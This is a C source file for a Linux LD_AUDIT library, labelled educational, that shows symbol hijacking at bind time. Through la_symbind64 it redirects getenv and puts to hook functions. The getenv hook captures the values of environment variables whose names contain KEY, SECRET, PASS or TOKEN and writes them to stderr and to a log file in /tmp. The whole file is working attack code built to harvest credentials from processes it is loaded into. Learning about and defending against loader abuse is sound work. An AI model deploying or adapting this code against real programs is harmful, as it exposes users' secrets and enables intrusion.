/*
 * audit_hijack.c - Symbol Hijacking via LD_AUDIT
 *
 * This library demonstrates the most powerful attack capability
 * of LD_AUDIT: redirecting function calls at symbol bind time.
 *
 * Unlike LD_PRELOAD which requires exporting replacement symbols,
 * LD_AUDIT can redirect ANY symbol to ANY address!
 *
 * Technique:
 *   1. In la_symbind64, check the symbol name
 *   2. If it's a target, set LA_SYMB_ALTVALUE flag
 *   3. Return the address of our hook function
 *   4. All calls to that symbol now go to our hook!
 *
 * Usage:
 *   LD_AUDIT=./libaudit_hijack.so ./target_program
 *
 * EDUCATIONAL PURPOSES ONLY
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <link.h>
#include <dlfcn.h>
#include <stdarg.h>

/* Color codes */
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

#define LOG_FILE "/tmp/ld_audit_hijack.log"

/* Original function pointers */
static char *(*real_getenv)(const char *) = NULL;
static int (*real_puts)(const char *) = NULL;
static int (*real_printf)(const char *, ...) = NULL;

static FILE *logfile = NULL;

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK FUNCTIONS
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Hook for getenv - capture all environment lookups */
char *hook_getenv(const char *name) {
    /* Get real getenv if we don't have it */
    if (!real_getenv) {
        real_getenv = dlsym(RTLD_NEXT, "getenv");
    }

    char *value = real_getenv(name);

    /* Log sensitive lookups */
    if (strstr(name, "KEY") || strstr(name, "SECRET") ||
        strstr(name, "PASS") || strstr(name, "TOKEN")) {
        fprintf(stderr, RED "[AUDIT HIJACK] " MAGENTA "getenv(\"%s\") = \"%s\"\n" RESET,
                name, value ? value : "(null)");

        if (logfile) {
            fprintf(logfile, "[HIJACK] getenv(%s) = %s\n", name, value ? value : "(null)");
            fflush(logfile);
        }
    }

    return value;
}

/* Hook for puts - intercept output */
int hook_puts(const char *s) {
    if (!real_puts) {
        real_puts = dlsym(RTLD_NEXT, "puts");
    }

    /* Log it */
    if (logfile) {
        fprintf(logfile, "[OUTPUT] puts: %s\n", s);
        fflush(logfile);
    }

    /* Prepend indicator that we intercepted it */
    fprintf(stderr, CYAN "[INTERCEPTED] " RESET);

    return real_puts(s);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * LA_VERSION
 * ═══════════════════════════════════════════════════════════════════════════ */

unsigned int la_version(unsigned int version) {
    (void)version;

    logfile = fopen(LOG_FILE, "w");
    if (logfile) {
        fprintf(logfile, "═══════════════════════════════════════════════════════\n");
        fprintf(logfile, "LD_AUDIT SYMBOL HIJACKING LOG\n");
        fprintf(logfile, "PID: %d\n", getpid());
        fprintf(logfile, "═══════════════════════════════════════════════════════\n\n");
    }

    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "            ★ LD_AUDIT SYMBOL HIJACKER ACTIVE ★                    " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "                                                                    " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Redirecting function calls via la_symbind64!                      " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Target symbols: getenv, puts                                      " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    return LAV_CURRENT;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * LA_OBJOPEN
 * ═══════════════════════════════════════════════════════════════════════════ */

unsigned int la_objopen(struct link_map *map, Lmid_t lmid, uintptr_t *cookie) {
    (void)map;
    (void)lmid;
    (void)cookie;

    /* Request symbol binding notifications */
    return LA_FLG_BINDTO | LA_FLG_BINDFROM;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * LA_SYMBIND64 - The Core of Symbol Hijacking
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * This function is called for EVERY symbol that gets resolved.
 * We can inspect the symbol and optionally redirect it to our hook.
 *
 * To redirect:
 *   1. Set *flags |= LA_SYMB_ALTVALUE
 *   2. Return the address of our hook function
 */

uintptr_t la_symbind64(Elf64_Sym *sym, unsigned int ndx,
                       uintptr_t *refcook, uintptr_t *defcook,
                       unsigned int *flags, const char *symname) {
    (void)ndx;
    (void)refcook;
    (void)defcook;

    /* Hijack getenv */
    if (strcmp(symname, "getenv") == 0) {
        fprintf(stderr, GREEN "  [HIJACK] " RESET "Redirecting getenv() → hook_getenv()\n");

        /* Save original for later use */
        real_getenv = (char *(*)(const char *))sym->st_value;

        /* Tell linker we're providing an alternate value */
        *flags |= LA_SYMB_ALTVALUE;

        if (logfile) {
            fprintf(logfile, "[HIJACK] getenv redirected: 0x%lx → 0x%lx\n",
                    (unsigned long)sym->st_value, (unsigned long)hook_getenv);
        }

        return (uintptr_t)hook_getenv;
    }

    /* Hijack puts */
    if (strcmp(symname, "puts") == 0) {
        fprintf(stderr, GREEN "  [HIJACK] " RESET "Redirecting puts() → hook_puts()\n");

        real_puts = (int (*)(const char *))sym->st_value;
        *flags |= LA_SYMB_ALTVALUE;

        if (logfile) {
            fprintf(logfile, "[HIJACK] puts redirected: 0x%lx → 0x%lx\n",
                    (unsigned long)sym->st_value, (unsigned long)hook_puts);
        }

        return (uintptr_t)hook_puts;
    }

    /* Not hijacking this symbol, return original */
    return sym->st_value;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * LA_PREINIT
 * ═══════════════════════════════════════════════════════════════════════════ */

void la_preinit(uintptr_t *cookie) {
    (void)cookie;

    fprintf(stderr, "\n");
    fprintf(stderr, YELLOW "  [la_preinit] " RESET "Symbol hijacking complete, program about to start\n");
    fprintf(stderr, "\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * DESTRUCTOR
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((destructor))
static void hijack_fini(void) {
    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "            ★ SYMBOL HIJACKING SESSION COMPLETE ★                  " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Log: " BLUE LOG_FILE RESET "                           " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    if (logfile) {
        fprintf(logfile, "\n[+] Session complete\n");
        fclose(logfile);
    }
}
